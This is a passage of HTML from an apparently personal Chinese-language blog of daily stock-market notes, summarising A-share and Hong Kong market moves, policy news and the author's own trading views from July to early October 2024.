title="总结"></a>总结</h4><p>见证历史，今日开盘上证指数涨停，盘中巨震下杀9%，双创板块继续延续强势，港股资金获利了结出现放量暴跌。目前来看情绪一致性仍在维持，虽然分歧十分凶险，但券商、半导体等核心板块并未出现大幅度分歧。当前的交易策略是一字板时抛出赌分歧出现做T，并把仓位逐渐向低位基本面良好的股票转移并适当减仓，以在出现实体阴线后博弈利润空间。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/1008.png" srcset="/img/loading.gif" lazyload></p><h3 id="10月7日-周一"><a href="#10月7日-周一" class="headerlink" title="10月7日 周一"></a>10月7日 周一</h3><h4 id="总结-29"><a href="#总结-29" class="headerlink" title="总结"></a>总结</h4><p>国庆期间港股继续大涨，富时A50指数涨超10%，叠加国庆开户情绪汹涌，日美大中华区ETF被疯抢，港股房地产券商概念暴涨，预计节后A股大多头情绪可持续，但要注意分歧的出现和倒车接人，还有获利了解盘涌出的情况出现。跟随炒作趋势布局优质股，目前仍在炒作金融股阶段，之后低位蓝筹股、绩优科技股和新兴产业概念股会轮番上演大涨，目前科创50仍在发行价1000点以下，值得布局，其他方向继续持有即可。</p><h3 id="9月30日-周一"><a href="#9月30日-周一" class="headerlink" title="9月30日 周一"></a>9月30日 周一</h3><h4 id="总结-30"><a href="#总结-30" class="headerlink" title="总结"></a>总结</h4><p>爱在深秋！已经涨得头晕目眩了，上周五说布局科创50和人工智能概念股，两个板块几乎全部涨停，干就完了。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0930.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月27日-周五"><a href="#9月27日-周五" class="headerlink" title="9月27日 周五"></a>9月27日 周五</h3><h4 id="总结-31"><a href="#总结-31" class="headerlink" title="总结"></a>总结</h4><p>每天都在见证历史，今天上午资金疯狂涌入，直接把上交所服务器干崩溃了…导致今日上证指数和科创50指数在10点之后几乎无法成交，资金转头拉动股指期货和深证成指和创业板指，创业板指盘中最高涨近12%。目前的策略是尽早离开红利股，金融科技在本周大都上涨超50%，不宜追逐，逐渐布局还在次低位的科技股，尤其科创50和人工智能概念股。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0927.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月26日-周四"><a href="#9月26日-周四" class="headerlink" title="9月26日 周四"></a>9月26日 周四</h3><h4 id="总结-32"><a href="#总结-32" class="headerlink" title="总结"></a>总结</h4><p>史诗级利好叠加，上证指数站回3000点！恒生科技暴涨7%，中国资产井喷，外资疯狂抢筹，资本市场放水周期已经到来。现在已经不是讨论什么时候高抛，而是选出最优质的多头情绪龙头。昨天认为指数已经到位，高抛了中国神华…今天中国海油受到沙特增产消息影响，下午大幅跳水，等待短期修复后抛出并向金融科技、半导体等超跌板块布局。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0926.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月25日-周三"><a href="#9月25日-周三" class="headerlink" title="9月25日 周三"></a>9月25日 周三</h3><h4 id="总结-33"><a href="#总结-33" class="headerlink" title="总结"></a>总结</h4><p>今天爆量，冲高回落，走出较为理想的趋势。目前来看，三大指数和恒生指数的跳空缺口应该会回补，指数已经基本到位，不会再有连续暴涨的动能，但仍有题材炒作的空间，目前观察今日的上引线能否在国庆节前的交易日能够在这个区间运行。今日过后大盘股上涨基本到位，目前认为以资源股银行股为代表的权重没有多少上涨空间，但以人工智能、半导体为代表的主要科技线还有很大的炒作空间，等待缺口回补之后，可以适当布局人工智能白马股和科创50。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0925.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月24日-周二"><a href="#9月24日-周二" class="headerlink" title="9月24日 周二"></a>9月24日 周二</h3><h4 id="总结-34"><a href="#总结-34" class="headerlink" title="总结"></a>总结</h4><p>多头盛宴！央行降息降准降存量房贷利率，开启股票借贷便利，引入千亿资金活水。股汇债期联动，走出远古巨阳。目前市场仍在预期QE大放水，静待消息落地。目前指数继续走中大阳线的空间不大，但科技、消费等个股板块还有炒作空间，继续保持重仓，当股价偏离上升五日线过远时注意回踩，进行止盈换仓。今日工业富联涨停，大金融主题暴涨，贵州茅台逼近涨停，接下来是考验盯盘和选股能力的时候。但要继续观察量能，如果暴量滞涨注意规避风险。目前主观判断应该有逼近3000点的可能，希望目前的刺激政策能够修复各大指数的周级别和月级别技术线，走一个段落式反弹。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0924.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月23日-周一"><a href="#9月23日-周一" class="headerlink" title="9月23日 周一"></a>9月23日 周一</h3><h4 id="总结-35"><a href="#总结-35" class="headerlink" title="总结"></a>总结</h4><p>国际地缘环境依然扑朔迷离，国际金价银价铜价均继续大幅上涨，石油的技术指标也得到修复。目前A股强撑大盘股，以双创为代表的小盘股仍在继续破新低，但由于上证指数支撑，有一些题材炒作可以延续，一个月以来依然没看到踩踏和任何放量，继续保持谨慎。对于港股，在连涨8天后，今日平收，可以认为是上涨趋势的顿挫，目前还有一定的博弈机会。近日大规模经济刺激政策的小道消息很多，但高层的定力很高，等待明日经济记者会的风向放出。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0923.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月20日-周五"><a href="#9月20日-周五" class="headerlink" title="9月20日 周五"></a>9月20日 周五</h3><h4 id="总结-36"><a href="#总结-36" class="headerlink" title="总结"></a>总结</h4><p>今天在昨日美股大涨的催化下，A股科技股和资源股小幅反弹，以紫金矿业与浪潮信息的反弹为代表，走出了一个技术修复。目前资源股和人工智能科技股的趋势线勾头向上，希望能有持续性。今日主要指数下跌，可见短线趋势并没有改变，但国家队突然现身并大量买入指数ETF，目前原因未明。目前降息预期落空，国债市场依然狂飙不止，没有刺激性政策A股短期难言趋势转好，继续看资源股的修复和恒生科技的上涨行情，A股继续保持谨慎。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0920.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月19日-周四"><a href="#9月19日-周四" class="headerlink" title="9月19日 周四"></a>9月19日 周四</h3><h4 id="总结-37"><a href="#总结-37" class="headerlink" title="总结"></a>总结</h4><p>美联储超预期降息50个基点，全球主要资本市场、黄金、原油均在今天出现上涨，明天将公布LPR和日本央行决议。今日港股开盘即拉升，恒生科技涨超3%，符合美联储释放流动性利好港股的判断，同时受到外围带动，A股也在十点过后出现拉升，但并没有出现情绪龙头带队，成交量保持在7000亿以下，可见资金谨慎的态度。但今日未放量的拉升也并非坏事，如果放巨量回落说明情绪根本没有回暖，资金仍在大量出逃。如果明天能释放利好，并且走出阶梯式放量，结合当前走平的大盘均线，可能会构造出一个小圆弧底并走出一段小反弹，指数的行情没有基本面支撑，但概念股和中概互联网可能存在博弈利润的空间。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0919.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月18日-周三"><a href="#9月18日-周三" class="headerlink" title="9月18日 周三"></a>9月18日 周三</h3><h4 id="总结-38"><a href="#总结-38" class="headerlink" title="总结"></a>总结</h4><p>本周是全球央行超级周，今夜美联储将宣布正式进入降息周期，日本央行和中国央行也将发表讲话，国内有进一步放水降息的预期。目前按照交易预期，如果美联储不进行大幅降息，则主要资本市场和贵金属大概率发生回调，总体趋势还得结合地缘环境和经济衰退预期的变化来判断。今日A股下破2700点，之后国家队现身上证50ETF和沪深300ETF护盘，将沪指拉红，但情绪线和科技线并没有利好催化。目前继续看A股下跌杀恐慌盘，继续保持对大盘股和白马股的持有规避情绪化杀跌风险，待底部确立可以布局新能源等超跌品种。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0918.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月13日-周五"><a href="#9月13日-周五" class="headerlink" title="9月13日 周五"></a>9月13日 周五</h3><h4 id="总结-39"><a href="#总结-39" class="headerlink" title="总结"></a>总结</h4><p>今日锂矿继续大幅下跌，创业板跌超1%，节前大盘表现依然弱势。目前国际资本市场和商品市场继续修复，没有走出继续计价衰退的趋势。昨日黄金突然暴涨，原因不明，银铜也跟着反弹，今日A股贵金属股票大幅反弹，但预计并不会有持续性。美联储降息即将到来，代表全球科技焦点的英伟达连续大涨，带动A股英伟达概念大幅修复，在A股弱势的情况下主力仍坚定抢筹，继续看好。前日中海油金针探底后今日大幅反弹，但还没到持仓成本价，继续跟踪，考虑投资性价比进行配置切换。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0913.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月12日-周四"><a href="#9月12日-周四" class="headerlink" title="9月12日 周四"></a>9月12日 周四</h3><h4 id="总结-40"><a href="#总结-40" class="headerlink" title="总结"></a>总结</h4><p>今日锂矿果然下跌，昨日逃顶成功，但由于股票本身性价比不低，如果下跌到涨停阳线的半分位可以考虑补仓。三桶油昨日放量探底回升之后今日小幅上涨，但只是缓涨修复，没有强势进攻，可能与原油价格底部还未探明有关。A股今日早盘开盘双创领涨，下午风格突变，银行石油拉升而科技股下跌，最终三大指数收阴，科创50领跌。目前没有强力刺激料九月还有一段杀跌，继续保持对科技股配置的谨慎态度。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0912.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月11日-周三"><a href="#9月11日-周三" class="headerlink" title="9月11日 周三"></a>9月11日 周三</h3><h4 id="总结-41"><a href="#总结-41" class="headerlink" title="总结"></a>总结</h4><p>今天A股小幅收阳，涨少跌多，双创领涨，港股走出小型探底回升。今日新能源上游产业链减产消息驱动，锂矿等能源金属众多明星股涨停。受到全球衰退预期影响，布伦特原油价格于近日跌至70美元以下，暂未有确认企稳的趋势，今日三桶油继续暴跌，但放量回升收金针探底，预期短线会有修复，但是否能扭转下跌趋势还暂未确立。目前A股仍然没有见底特征，继续保持谨慎等待刺激政策发力或入场资金。</p><h3 id="9月10日-周二"><a href="#9月10日-周二" class="headerlink" title="9月10日 周二"></a>9月10日 周二</h3><h4 id="总结-42"><a href="#总结-42" class="headerlink" title="总结"></a>总结</h4><p>今天A股三大指数探底回升小幅收阳，近日市场高低切换特征明显，以人工智能为代表，近日上证指数大跌时并没有下探2月份低点，同时创业板指数见低点的同时银行指数见高点。今天受苹果和华为发布会科技春晚情绪影响，市场自发炒作产业链股票，国家队并没有花大钱露面，但股债跷跷板并没有成立，成交量也并没有放出，可见没有增量资金入场。未来两日可能会重新掉头向下，等待行情验证。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0910.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月9日-周一"><a href="#9月9日-周一" class="headerlink" title="9月9日 周一"></a>9月9日 周一</h3><h4 id="总结-43"><a href="#总结-43" class="headerlink" title="总结"></a>总结</h4><p>今天A股上证指数继续走出加速下跌，大盘资源股继续暴跌，国家队并没有在上证50和沪深300ETF露面，但却离奇拉升创业板，可能与前两周拉升中证1000ETF有关。今天加速下跌杀止损盘的形态成立，但仍然没有大量恐慌涌出，近期继续保持持有不动。目前港股恒生科技位置已经极具性价比，投资回报在A股没有重大利好的情况下预计将高于创业板、科创板，布局窗口在美联储宣布降息附近。继续投资新质生产力人工智能半导体板块，以锂矿、光伏为代表的新能源基本面没有好转，但弹性较大，可以适当博弈。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0909.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月6日-周五"><a href="#9月6日-周五" class="headerlink" title="9月6日 周五"></a>9月6日 周五</h3><h4 id="总结-44"><a href="#总结-44" class="headerlink" title="总结"></a>总结</h4><p>今天A股走出一根中阴线，但没有出现放量的恐慌，继续处于加速下跌趋势。目前已经即将达到年线支撑2750附近，可能会有所徘徊，但继续下探的可能性极大，除非能杀出两根中大阴线叠加政策和国家队双重发力才能快速走出修复上涨行情。目前已经没什么操作的机会，手中持有的股票已经位置很低，近期继续减少操作频率，在杀恐慌期间寻找错杀的高性价比股票。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0906.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月5日-周四"><a href="#9月5日-周四" class="headerlink" title="9月5日 周四"></a>9月5日 周四</h3><h4 id="总结-45"><a href="#总结-45" class="headerlink" title="总结"></a>总结</h4><p>今天A股国家队又出面护盘，继续缩量横盘，没有看出恐慌盘的痕迹。但目前许多科技个股小票的五日十日技术线走平，如果明天在创业板、中证500等指数补量站上五日线，则可能还有一波小票反弹的行情可以做。目前主要布局在从高位跳下来的红利大盘股，今日神华和海油居然继续下探低点，这是超乎预料的。目前继续保持持仓不动，大盘没有走出恐慌跳水的格局则继续对科技股保持谨慎，红利股一定会有继续走牛的时机，继续持仓静待即可。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0905.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月4日-周三"><a href="#9月4日-周三" class="headerlink" title="9月4日 周三"></a>9月4日 周三</h3><h4 id="总结-46"><a href="#总结-46" class="headerlink" title="总结"></a>总结</h4><p>今天A股走出加速下跌，昨日资金计价🇺🇸经济衰退，美股暴跌，英伟达跌近10%，原油跌近5%，导致今日A股石油股大跌，资源股补跌。今日小票表现尚可，创业板和科创板走震荡。但以上证指数为代表，走势已经严重偏离五日线，代表国家队护盘的510300近日也没有明显动作。目前希望在近五个交易日能继续下杀出恐慌，成交量放出，跌幅放大，跌停家数增多。目前主要资金配置在科技龙头白马股和资源权重股，继续保持谨慎，减少操作。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0904.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月3日-周二"><a href="#9月3日-周二" class="headerlink" title="9月3日 周二"></a>9月3日 周二</h3><h4 id="总结-47"><a href="#总结-47" class="headerlink" title="总结"></a>总结</h4><p>外围局势风雨飘摇，纽约铜直逼新低，资金计价全球经济衰退。今天的行情也是扑朔迷离，昨日小盘阴包阳，今日大盘股补跌而创业板科创板弱势修复，缩量站回五日线。目前继续保持指数仍在加速下跌阶段观点不变，但跌幅空间极其有限。最近行情没有主线规律可循，暂时不伸手，以中国海油、中国神华为代表的高股息护盘类品种，若进行拉升护盘，早日止盈。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0903.png" srcset="/img/loading.gif" lazyload></p><h3 id="9月2日-周一"><a href="#9月2日-周一" class="headerlink" title="9月2日 周一"></a>9月2日 周一</h3><h4 id="总结-48"><a href="#总结-48" class="headerlink" title="总结"></a>总结</h4><p>上周五上涨的中阳线走出阴包阳，行情十分卑劣，周五的增量盘又被套住，看未来几日，国家队是否出面死顶盘面。继续保持行情需要恐慌盘涌出才有抄底机会的观点，继续观察浪潮信息、中科曙光的周线缺口是否能够得到回补。港股目前走得比A股坚韧，考虑港股龙头企业基本面回暖和美联储降息流动性增加预期，可以逐渐进行布局。但港股受到A股的压制，利润博弈空间不确定，不宜重仓。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0902.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月份总结"><a href="#8月份总结" class="headerlink" title="8月份总结"></a>8月份总结</h3><p>因为技术受限和懒惰，在家没有更新。8月中下旬呈现缩量下跌格局，白马股杀流动性，中小盘股跌跌不休，深成指和创业板指皆逼近2月份低点，在月末迎来了全面普反，各大指数站上五日线，在九月初预计还有一段小幅反弹和题材唱戏的行情。目前AI人工智能的位置很低，投资价值凸显，但是长期横盘缩量没有恐慌盘涌出的阴影仍然笼罩，目前继续认为今年下半年的低点不在2815点，保持谨慎。</p><h3 id="8月7日-周三"><a href="#8月7日-周三" class="headerlink" title="8月7日 周三"></a>8月7日 周三</h3><h4 id="总结-49"><a href="#总结-49" class="headerlink" title="总结"></a>总结</h4><p>今日刚刚盯上红利股最近走弱，红利股就大幅反弹，其中中国海油目前性价比凸显，可作为日后避险选择。今日科技股本震荡整理，但下午突然跳水，多数科技板块破位，警惕杀跌风险。目前浪潮信息已经连跌3周，从之前的周线来看，都会有两周左右的反弹窗口，如果指数未来两天没有走弱，且浪潮信息没有快速修复，可以进行适当调仓。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0807.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月6日-周二"><a href="#8月6日-周二" class="headerlink" title="8月6日 周二"></a>8月6日 周二</h3><h4 id="总结-50"><a href="#总结-50" class="headerlink" title="总结"></a>总结</h4><p>今日日韩台股大幅修复，昨日纳斯达克探底收大阳线，资本市场局势扑朔迷离，今日沪深300大部分时间运行在国家队平均成本以下，尾盘国家队突然入场将沪深300拉红，可见仍然在维稳，等待7月宏观数据和港股科技巨头中报数据，目前中期形势依然不改，每一次修复都是优化仓位的时机。继续布局恒生科技和中概互联网，博弈美股七巨头的修复行情。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0806.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月5日-周一"><a href="#8月5日-周一" class="headerlink" title="8月5日 周一"></a>8月5日 周一</h3><h4 id="总结-51"><a href="#总结-51" class="headerlink" title="总结"></a>总结</h4><p>见证历史！今日日经指数触发熔断机制，世界主要资本市场全部崩盘，日经指数收跌超12%，纳斯达克100指数期货亚洲盘跌幅超5%，日元兑美元快速下探140关口，危机四伏。今日A股早盘表现良好，3000多支股票飘红，下午收到恐慌情绪进一步蔓延，A股同样加速跳水，但尾盘港股有所回升。自上周周三立起一根中阳线后能够有一段反弹行情的判断错误，但其他高位资本市场的崩盘有利于走出“东升西降”的格局，继续观察美联储表态和贵重金属等避险资产走势，保持A股仍有一段加速下跌杀恐慌盘的观点不变。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0805.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月2日-周五"><a href="#8月2日-周五" class="headerlink" title="8月2日 周五"></a>8月2日 周五</h3><h4 id="总结-52"><a href="#总结-52" class="headerlink" title="总结"></a>总结</h4><p>昨日纳斯达克继续暴跌，今日亚洲股市全线崩盘，全球市场正在交易衰退预期，今日上证指数回踩五均，继续保持还有一段上行走势的观点，港股性价比逐渐显现，可以持续向恒生科技ETF优化持仓。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0802.png" srcset="/img/loading.gif" lazyload></p><h3 id="8月1日-周四"><a href="#8月1日-周四" class="headerlink" title="8月1日 周四"></a>8月1日 周四</h3><h4 id="总结-53"><a href="#总结-53" class="headerlink" title="总结"></a>总结</h4><p>今日美联储降息预期落地，预计9月份会第一次降息。今日A股行情分化，前期坚挺的半导体依然没有见顶现象，而大跌的新能源和白酒等昨日反弹后今日又出现阴包阳，可见趋势未见反转。短期继续看A股震荡修复，主要以科技线和证券行情为主。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0801.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月31日-周三"><a href="#7月31日-周三" class="headerlink" title="7月31日 周三"></a>7月31日 周三</h3><h4 id="总结-54"><a href="#总结-54" class="headerlink" title="总结"></a>总结</h4><p>A股很久没有出现这样的强力中阳线了。今日由券商带队，科技股全面爆发，成交量超9000亿，可见情绪回暖和博弈利好的活跃。今日资金行为主要解读为昨日重要会议提出的新论调，和资金提前交易明日美联储鸽派信息的放出。但目前汇率端和国债端并没有形成跷跷板效应，主要为短期炒作资金做的超跌反弹行为，近日逢高可以逐渐优化仓位。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0731.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月30日-周二"><a href="#7月30日-周二" class="headerlink" title="7月30日 周二"></a>7月30日 周二</h3><h4 id="总结-55"><a href="#总结-55" class="headerlink" title="总结"></a>总结</h4><p>公募基金重仓股打开下跌空间，尤其白酒板块深不见底。国家队继续抱团金融，游资抱团炒作连板股票。不放量，不加速，继续洗洗睡的行情。但目前的时间周期需要谨慎，目前传统的多头时间，A股没有主线，港股又将确立破位，如果再无修复行情则市场岌岌可危。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0730.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月29日-周一"><a href="#7月29日-周一" class="headerlink" title="7月29日 周一"></a>7月29日 周一</h3><h4 id="总结-56"><a href="#总结-56" class="headerlink" title="总结"></a>总结</h4><p>很喜欢螺旋老师的一句话：这盘子又是洗洗睡的行情。横久必跌，指数一直挂在2900点附近，既没有买盘放量，也没有恐慌盘的涌出，等待本周重要会议是否会释放一些资本市场的信号，短期继续持币观望。8月过后南向资金也不披露实时数据了，分析资金已经没什么意义了。但港股尤其是互联网龙头的估值已经很低了，等待美联储进入降息周期应当会有一波50%以上的大反弹，最近可以逐步布局。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0729.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月26日-周五"><a href="#7月26日-周五" class="headerlink" title="7月26日 周五"></a>7月26日 周五</h3><h4 id="总结-57"><a href="#总结-57" class="headerlink" title="总结"></a>总结</h4><p>纳斯达克指数继续下跌，但A股今日反弹，呈现小普涨的格局，但赚钱效应一般，成交量也没有进一步放大，看短暂的弱势修复，继续持筹场外观望。港股性价比逐渐凸显，如果A股联动加速下跌可以进行布局，如果A股延续弱势，510300仍然放量，则看港股下探前低附近。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0726.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月25日-周四"><a href="#7月25日-周四" class="headerlink" title="7月25日 周四"></a>7月25日 周四</h3><h4 id="总结-58"><a href="#总结-58" class="headerlink" title="总结"></a>总结</h4><p>最近全球资本市场风声鹤唳，A股各大指数破位，成交量仍然没有放出，美股昨天崩盘之后今天也没有强势修复的征兆，全球正在交易大衰退的预期，继续持币观望。但值得注意的是，离岸人民币突然大幅升值，既有日元走强美元指数弱势的原因，也可能与设备更新的政策有关，但如果汇率没有走出持续性，那么A股资产目前依旧不会受到外资青睐。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0725.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月24日-周三"><a href="#7月24日-周三" class="headerlink" title="7月24日 周三"></a>7月24日 周三</h3><h4 id="总结-59"><a href="#总结-59" class="headerlink" title="总结"></a>总结</h4><p>今天并未随着认沽期权的平仓而止跌企稳，上午走出的十字星也没有迎来下午的金针探底，那就是下跌中继无疑了。说了好几次的逢高减仓，终于在今天减掉了。继续场外观察是否出现指数突然加速，恐慌盘涌出。目前先看2860点附近的跳空缺口补了之后能否企稳。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0724.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月23日-周二"><a href="#7月23日-周二" class="headerlink" title="7月23日 周二"></a>7月23日 周二</h3><h4 id="总结-60"><a href="#总结-60" class="headerlink" title="总结"></a>总结</h4><p>今日A股空头情绪宣泄，利空未知，料与明日ETF期权交割有关，但下午两点时分突然杀出恐慌盘，指数迅速跳水，尤其科创50跌4%，半导体大跌，抱团科特估的逻辑受到挑战。今日大跌，主要指数都下穿了所有日级别均线，护盘一周的努力有付之东流之势，看明日下午交割结束后是否有探底企稳之势，否则可能复刻今年一月末恐慌踩踏的走势。近日的明星沙特ETF溢价基本跌完，可以考虑博弈市场失望情绪导致的抱团行为。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0723.png" srcset="/img/loading.gif" lazyload></p><h4 id="资金"><a href="#资金" class="headerlink" title="资金"></a>资金</h4><p>今日南向资金小幅流入，受A股大跌影响港股也有所回落，继续以AH联动逻辑跟踪。</p><h3 id="7月22日-周一"><a href="#7月22日-周一" class="headerlink" title="7月22日 周一"></a>7月22日 周一</h3><h4 id="总结-61"><a href="#总结-61" class="headerlink" title="总结"></a>总结</h4><p>今日A股涨多跌少，但指数并未翻红，主要受红利资产抱团逐渐瓦解影响，权重股均出现回调。但在H股中却呈现上涨，可见港股投资性价比逐渐显现。待经济指标企稳后，在美联储降息的驱动下，港股受基本面和流动性双重利好，一定会走出一波精彩的行情。但是目前，A股仍然由国家队资金托举，市场大资金做多意愿不强，近期持续关注代表科特股概念的半导体，如果有效突破可能会催生出中特股转科特估的行情。近期美股财报季叠加交易降息预期即将结束，随时都可能大幅回调，继续保持谨慎。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0722.png" srcset="/img/loading.gif" lazyload></p><h4 id="A股-185"><a href="#A股-185" class="headerlink" title="A股"></a>A股</h4><p>今天的股市不可谓不精彩，中信证券九连阳之后，舆论在自媒体发酵，周末横空出世一位上海爷叔的惊人论断，散户齐聚，成交金额超70亿，在国家队和外资的推动下，中信证券最终收跳空阳线，但所谓中信证券三连板纯属无稽之谈。周末在互联网上发酵的多头情绪叠加今日央行双降利好，中小盘科技股上午表现良好，双创板块大面积飘红。但由于银行、石油等红利资产的下跌和大资金的恐高情绪，下午双创指数大幅回落至海平面以下。但在两点半时，国家队多处发力，拉升权重股和沪深300ETF稳住了盘面，其中510300半小时流入超50亿，可见继续护盘之决心。但目前市场情绪并没有逆转，复苏逻辑也没有坚实的证据，考虑近期减仓消费板块。</p><h4 id="资金-1"><a href="#资金-1" class="headerlink" title="资金"></a>资金</h4><p>今日南向资金流入20亿，港股涨超1%，看修复性行情，考虑博弈中概互联网中报预期。</p><h3 id="7月19日-周五"><a href="#7月19日-周五" class="headerlink" title="7月19日 周五"></a>7月19日 周五</h3><h4 id="总结-62"><a href="#总结-62" class="headerlink" title="总结"></a>总结</h4><p>全球主要股市继续维持弱势，🇺🇸科技股有一段回调的预期。恒生指数今日大跌破位，若下周前两个交易日不能拉回，则可能试探4月份前低（16000点），继续维持谨慎。今日重要会议结束，科创50继续走强，半导体放量上涨，抱团情绪明显。代表消费复苏的医药、白酒连涨一周，看修复行情，但基本面不支撑反转。今日3000余只个股上涨，在科技方向，主要以龙头和国企央企领涨，科特股行情仍有持续性，但整体交易仍不活跃，债市避险情绪依然浓厚，看A股继续震荡反弹，继续观察情绪指标。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0719.png" srcset="/img/loading.gif" lazyload></p><h4 id="资金-2"><a href="#资金-2" class="headerlink" title="资金"></a>资金</h4><p>今日港股毫无抵抗式下跌，南向资金大幅买入60多亿，国家队护盘方向的沪深300ETF（510300）放出巨量113.7亿，从量上来看猛拉六波，短期内大盘风险不大，继续观察资金轮动。</p><h3 id="7月18日-周四"><a href="#7月18日-周四" class="headerlink" title="7月18日 周四"></a>7月18日 周四</h3><h4 id="总结-63"><a href="#总结-63" class="headerlink" title="总结"></a>总结</h4><p>今天没什么看头，纳斯达克昨晚崩盘式下跌近3%，半导体暴跌，但今日仍在重大会议期间，国家队尽力维稳，指数为非市场化走势。未来趋势还得看明日利好和下半年经济政策预期。近日半导体抱团现象明显，注意观察是否出现放量回落。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0718.png" srcset="/img/loading.gif" lazyload></p><h3 id="7月17日-周三"><a href="#7月17日-周三" class="headerlink" title="7月17日 周三"></a>7月17日 周三</h3><h4 id="总结-64"><a href="#总结-64" class="headerlink" title="总结"></a>总结</h4><p>黄金如期突破历史性高点，创下2482美元&#x2F;盎司的新高，中午时分，纳斯达克100指数期货突然下跌1%，原因不明。今日A股涨少跌多，科技线没有表现，市场炒作以白酒、医药为代表的消费复苏预期，可能与明日重大会议的利好和路透社传周六降息有关。今日多头力量薄弱，港股弱势修复，A股小放量下跌，代表神秘资金护盘的沪深300ETF（510300）显著放量，但没有恐慌性抛盘涌出。考虑到近日美联储议息会议和两会的重要经济决策等信息即将放出，近几日的A股市场反应将决定下半年的整体趋势。</p><p><img src="https://m0dzer0.github.io/post/%E6%8A%95%E8%B5%84%E7%AC%94%E8%AE%B0/0717.png" srcset="/img/loading.gif" lazyload></p><h4 id="资金-3"><a href="#资金-3" class="headerlink" title="资金"></a>资金</h4><p>今日港股弱势修复，南向资金小幅流出，可能与资金离开港股护盘A股的行为有关。主力资金流出超300亿，两市成交量约6750亿。</p><h3 id="7月16日-周二"><a href="#7月16日-周二" class="headerlink" title="7月16日 周二"></a>7月16日 周二</h3><h4 id="总结-65"><a href="#总结-65" class="headerlink" 